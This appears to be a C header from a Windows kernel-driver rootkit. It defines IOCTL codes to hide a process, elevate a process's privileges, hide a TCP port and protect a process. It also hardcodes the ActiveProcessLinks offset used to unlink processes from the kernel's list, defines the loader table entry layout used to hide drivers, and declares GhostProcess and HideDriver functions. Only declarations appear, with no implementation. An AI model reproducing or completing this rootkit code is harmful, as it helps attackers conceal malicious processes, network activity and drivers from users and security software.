#include <ntddk.h>

#define ACTIVE_PROCESS_LINKS 0x448

#pragma region IOCTL

#define IOCTL_HIDEPROC	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0001, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_ELEVATEME CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0002, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_HIDETCP	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0003, METHOD_NEITHER, FILE_SPECIAL_ACCESS) //Work in progress
#define IOCTL_PROTECT	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0004, METHOD_NEITHER, FILE_SPECIAL_ACCESS)

struct HideProcData {
	ULONG TargetPID;
};

struct ElevateData {
	ULONG TargetPID;
};

struct HideTcpData {
	ULONG Port;
};

struct ProtectProcessData {
	ULONG TargetPID;
};

#pragma endregion

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

//	GHOST
PCHAR GhostProcess(UINT32 PID);
VOID HideDriver(PDRIVER_OBJECT DriverObject);
